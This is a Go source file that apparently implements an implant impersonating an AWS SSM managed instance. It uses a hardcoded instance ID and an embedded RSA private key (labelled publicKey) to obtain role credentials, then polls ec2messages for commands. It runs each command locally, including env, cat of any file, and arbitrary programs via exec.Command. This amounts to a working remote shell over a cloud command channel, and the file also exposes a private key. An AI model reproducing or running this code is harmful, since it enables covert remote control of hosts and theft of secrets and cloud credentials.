package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unicode/utf8"

	"github.com/aws/amazon-ssm-agent/agent/contracts"
	"github.com/aws/amazon-ssm-agent/agent/jsonutil"
	"github.com/aws/amazon-ssm-agent/agent/times"
	"github.com/aws/amazon-ssm-agent/extra/aws-sdk-go/service/ssmmds"
	"github.com/aws/aws-sdk-go/aws"
	"github.com/djherbis/atime"
	"github.com/grines/ssmmm/awsauth"
	"github.com/mitchellh/go-ps"
)

const managedInstanceID string = "mi-0d416eb76fdc3f731"
const publicKey string = "MIIEowIBAAKCAQEAwCWYd69ADZjlmqvP+NtnWQi82cq+TmpHMlvNzHm2VXmxgEikNUDGcK9JxsgrIDw6T0EzRFXbl2X2vpqAtX3lV+ALs+sSwNkYrPUtBFwxydxwUHuq+4QJcIfRMsRjwPLOEon5zYBdvbu3AWhq4OHcqmYyTg3kQFW+UeH5Zsh96aDAejlHELtXYxUi12K+roefDQY5G5ePgL3+7UXGfxo/etuNOy9nNPRcNCLTt3dDNP8kc478t50PNpgDmXTataIZahte5IvUeTaaLlYqIl65NJ7RgM2PIDF1yEymnMTWUva1lG5q1Z03r9qpMxuSc2IP5+QVwueTf5OugXVwHCA8wwIDAQABAoIBAQCz3L1rE2ZPFBehgEEOfzqvsiktacZYms2Iiz0KscgHHQIVxmnH25ml87+IzujnpNkkRTEbP49tmimt4+yld3LOnk/2HA8S7GVXya1ZDoAgqDOOcyTriX5Ykxo1fnauL9rMqdFnF0koiOXW8IpTdblc3IssW36U5m5gMbqHBxguLwZQ2LOL0v0w2qDJ6nGE2kAtARVLVnB9YXVy+ouTQ4UH/UeMyZp2SVws0I96vUUZa3GaN8lYQzEKZDeLJU4HzoCvffx5ju3a6OdkS1il5SvoRgdKw/8XiOGlLgqFQLW5/nMQxEzmO9AZxFLxG1RoY8PslrNnk/Ha5azgZpqRfl5hAoGBAMy+EY+/ShJ8uS087sMwVfEEimkxmlFOFWyAvtx9D2ZddEXMn4EbTrFcm6dLawEbrzE67vEvdIS+/ps/ZLQeNCNJZBS6BmriD+2xknPDWPhvqV6gl1Dmc/AESC1OmVCVu/QubveXOFgU5/yBFW0rSVbGnlqCloPwj/uBaWRcPVwTAoGBAPBARqC+iNaM1THDUW/Gq+CN7AsVzXAfy/wPqVWwPS5wDnE7fQLIFB2ugjoxEFX8BAS1GGVNBmNPRT0jmRLtjsRyzdlX0kTMRAvQbPGcHq/5tbEIhHyycrmoD07j0hD2seb4l92YGhNUxfZYxWdg8Rlw4ce6L+m3/Jw6V3S8u1KRAoGAXFKYuKkZTZzQI4YGZB23oybZAvZLD76WCodDiUkbWJ1rgM30XtNheLi5t4ZaifVh2mEovbkYYYN+a6L6Vf4IpKDDcFUx76Bgbl5UG79Krzwqs3DWyrQgM2q64TNADwZ16nXFs/+MeKt0sHfEoaWTPH3zify4wmYHhvGkBI1TXeECgYB+c3Y5GM/xDQMRRBpS2KCSemBonTsZ7sJwktWvsikhjf0sAAGWOzTLQpRsiHJur0x2JdMHTnk0P/7TZS8mVT61iy9pW93iNBkEltkgeel0+dt1qGQDNfFIYnpcLXDdWNreFK3qBiqDTjU7qhGMjeuYVl+fvhGF1D7zA4oQeV2m4QKBgE20jUPRq6u5v6mFqojilGOFuIvGwNMyfcsTE6huImZ+3Mvxh1uvbd4LzV4XfrIlCRbmCQEcgIEx12YjtRalkna506GIIxH8Kl++39Zd7VDAal2MQH5j+IfUGqSsFg1cxWEOOboJRBSDntM47MT9803XEFSU00nSmoFsN1lRWHjP"
const fingerPrint string = "90312ec8-c247-47eb-823f-ad6e8ae1fff5"

type FileBrowser struct {
	Files        []FileData     `json:"files"`
	IsFile       bool           `json:"is_file"`
	Permissions  PermissionJSON `json:"permissions"`
	Filename     string         `json:"name"`
	ParentPath   string         `json:"parent_path"`
	Success      bool           `json:"success"`
	FileSize     int64          `json:"size"`
	LastModified string         `json:"modify_time"`
	LastAccess   string         `json:"access_time"`
}

type PermissionJSON struct {
	Permissions FilePermission `json:"permissions"`
}

type FileData struct {
	IsFile       bool           `json:"is_file"`
	Permissions  PermissionJSON `json:"permissions"`
	Name         string         `json:"name"`
	FullName     string         `json:"full_name"`
	FileSize     int64          `json:"size"`
	LastModified string         `json:"modify_time"`
	LastAccess   string         `json:"access_time"`
}

type FilePermission struct {
	UID         int    `json:"uid"`
	GID         int    `json:"gid"`
	Permissions string `json:"permissions"`
	User        string `json:"user,omitempty"`
	Group       string `json:"group,omitempty"`
}

const (
	layoutStr = "01/02/2006 15:04:05"
)

func main() {
	signer := awsauth.BuildRsaSigner(managedInstanceID, publicKey, "AmazonSSM.RequestManagedInstanceRoleToken", "ssm", "us-east-1", time.Now(), 0, `{"Fingerprint":"90312ec8-c247-47eb-823f-ad6e8ae1fff5"}`)
	signer.SignRsa()

	client := &http.Client{}
	resp, _ := client.Do(signer.Request)
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	var data awsauth.AwsToken
	err := decoder.Decode(&data)
	if err != nil {
		fmt.Println("Got Token.")
	}

	req, body := awsauth.BuildRequest("ec2messages", "us-east-1", `{"Destination":"`+managedInstanceID+`","MessagesRequestId":"`+awsauth.UniqueID()+`","VisibilityTimeoutInSeconds":10}`)

	signer3 := awsauth.BuildSigner(data.AccessKeyID, data.SecretAccessKey, data.SessionToken)
	signer3.Presign(req, body, "ec2messages", "us-east-1", 0, time.Now())

	//fmt.Println(header)
	//fmt.Println(req)
	resp3, _ := client.Do(req)
	defer resp3.Body.Close()
	decoder2 := json.NewDecoder(resp3.Body)
	//fmt.Println(decoder2)
	var data2 awsauth.DocMessage
	decoder2.Decode(&data2)
	//fmt.Println(data2.Messages)
	for _, m := range data2.Messages {
		//fmt.Println(m)
		var payload SendCommandPayload
		json.Unmarshal([]byte(m.Payload), &payload)
		jsonutil.Marshal(payload)
		cmdid := payload.CommandID
		for _, c := range payload.Parameters {
			str := fmt.Sprintf("%v", c)
			str = strings.TrimSuffix(str, "]")
			str = trimFirstRune(str)
			fmt.Println(str)
			runCommand(str, cmdid)
		}
	}

}

func runCommand(commandStr string, cmdid string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	switch arrCommandStr[0] {
	case "ps":
		processList, _ := ps.Processes()
		// map ages
		for x := range processList {
			var process ps.Process
			process = processList[x]
			data := fmt.Sprintf("%d\t%s\n", process.Pid(), process.Executable())

			fmt.Println(data)

			// do os.* stuff on the pid
		}
		fmt.Println(workingDir())
	case "env":
		data := strings.Join(os.Environ(), "\n")
		fmt.Println(data)
		fmt.Println(workingDir())
	case "whoami":
		data, _ := user.Current()
		fmt.Println(data)
		fmt.Println(workingDir())
	case "pwd":
		data, _ := os.Getwd()
		fmt.Println(data)
		fmt.Println(workingDir())
	case "ls":
		var path string
		if len(arrCommandStr) == 1 {
			path = "./"
		} else {
			path = arrCommandStr[1]
		}
		list := list(path)
		data := strings.Join(list, "\n")
		fmt.Println(data)
		fmt.Println(workingDir())
	case "cat":
		data := cat(arrCommandStr[1])
		fmt.Println(data)
		fmt.Println(workingDir())
	case "cd":
		if len(arrCommandStr) > 1 {
			os.Chdir(arrCommandStr[1])
			fmt.Println(workingDir())
		}
		return nil
	case "kill":
		os.Exit(0)
	default:
		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		err := cmd.Run()
		if err != nil {
			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
			return nil
		}
		fmt.Println(out.String())
		fmt.Println(workingDir())
		return nil
	}
	return nil
}

func base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func base64Decode(str string) string {
	data, _ := base64.StdEncoding.DecodeString(str)
	return string(data)
}

func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}

func split(s string, size int) []string {
	ss := make([]string, 0, len(s)/size+1)
	for len(s) > 0 {
		if len(s) < size {
			size = len(s)
		}
		ss, s = append(ss, s[:size]), s[size:]

	}
	return ss
}

var letters = []rune("123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func cat(filename string) string {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println("File reading error", err)
		return "Error reading file " + filename
	}
	fmt.Println("Contents of file:", string(data))
	return string(data)
}

func exists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}

func list(path string) []string {
	checkPath, _ := exists(path)
	if checkPath {
		data := []string{}
		//var users []string

		var e FileBrowser
		abspath, _ := filepath.Abs(path)
		dirInfo, err := os.Stat(abspath)
		if err != nil {
			fmt.Println("Error")
		}
		e.IsFile = !dirInfo.IsDir()

		//p := FilePermission{}
		e.Permissions.Permissions = GetPermission(dirInfo)
		e.Filename = dirInfo.Name()
		e.ParentPath = filepath.Dir(abspath)
		if strings.Compare(e.ParentPath, e.Filename) == 0 {
			e.ParentPath = ""
		}
		e.FileSize = dirInfo.Size()
		e.LastModified = dirInfo.ModTime().Format(layoutStr)
		at, err := atime.Stat(abspath)
		if err != nil {
			e.LastAccess = ""
		} else {
			e.LastAccess = at.Format(layoutStr)
		}
		e.Success = true

		if dirInfo.IsDir() {
			files, err := ioutil.ReadDir(abspath)
			if err != nil {
				fmt.Println("Error")
			}

			fileEntries := make([]FileData, len(files))
			for i := 0; i < len(files); i++ {
				fileEntries[i].IsFile = !files[i].IsDir()
				fileEntries[i].Permissions.Permissions = GetPermission(files[i])
				fileEntries[i].Name = files[i].Name()
				fileEntries[i].FullName = filepath.Join(abspath, files[i].Name())
				fileEntries[i].FileSize = files[i].Size()
				fileEntries[i].LastModified = files[i].ModTime().Format(layoutStr)
				at, err := atime.Stat(abspath)
				if err != nil {
					fileEntries[i].LastAccess = ""
				} else {
					fileEntries[i].LastAccess = at.Format(layoutStr)
				}
			}
			e.Files = fileEntries
		}
		for _, f := range e.Files {
			line := fmt.Sprintf("%s %s %s %s %s %s", f.FullName, f.LastAccess, f.LastModified, f.Permissions.Permissions.User, f.Permissions.Permissions.Group, f.Permissions.Permissions.Permissions)
			data = append(data, line)
		}
		//header := []string{"File", "LastAccess", "LastModified", "User", "Group", "Permissions"}
		//tables.TableData(data, header)
		return data
	}
	return nil
}

func GetPermission(finfo os.FileInfo) FilePermission {
	perms := FilePermission{}
	perms.Permissions = finfo.Mode().Perm().String()
	systat := finfo.Sys().(*syscall.Stat_t)
	if systat != nil {
		perms.UID = int(systat.Uid)
		perms.GID = int(systat.Gid)
		tmpUser, err := user.LookupId(strconv.Itoa(perms.UID))
		if err == nil {
			perms.User = tmpUser.Username
		}
		tmpGroup, err := user.LookupGroupId(strconv.Itoa(perms.GID))
		if err == nil {
			perms.Group = tmpGroup.Name
		}
	}
	return perms
}

func workingDir() string {
	path, _ := os.Getwd()
	return path
}

func trimFirstRune(s string) string {
	_, i := utf8.DecodeRuneInString(s)
	return s[i:]
}

type SendCommandPayload struct {
	Parameters              map[string]interface{}    `json:"Parameters"`
	DocumentContent         contracts.DocumentContent `json:"DocumentContent"`
	CommandID               string                    `json:"CommandId"`
	DocumentName            string                    `json:"DocumentName"`
	OutputS3KeyPrefix       string                    `json:"OutputS3KeyPrefix"`
	OutputS3BucketName      string                    `json:"OutputS3BucketName"`
	CloudWatchLogGroupName  string                    `json:"CloudWatchLogGroupName"`
	CloudWatchOutputEnabled string                    `json:"CloudWatchOutputEnabled"`
}

func createMDSMessage(commandID string, payload string, topic string, instanceID string) ssmmds.Message {
	messageCreatedDate := time.Date(2015, 7, 9, 23, 22, 39, 19000000, time.UTC)

	c := sha256.New()
	c.Write([]byte(payload))
	payloadDigest := string(c.Sum(nil))

	return ssmmds.Message{
		CreatedDate:   aws.String(times.ToIso8601UTC(messageCreatedDate)),
		Destination:   aws.String(instanceID),
		MessageId:     aws.String("aws.ssm." + commandID + "." + instanceID),
		Payload:       aws.String(payload),
		PayloadDigest: aws.String(payloadDigest),
		Topic:         aws.String(topic),
	}
}
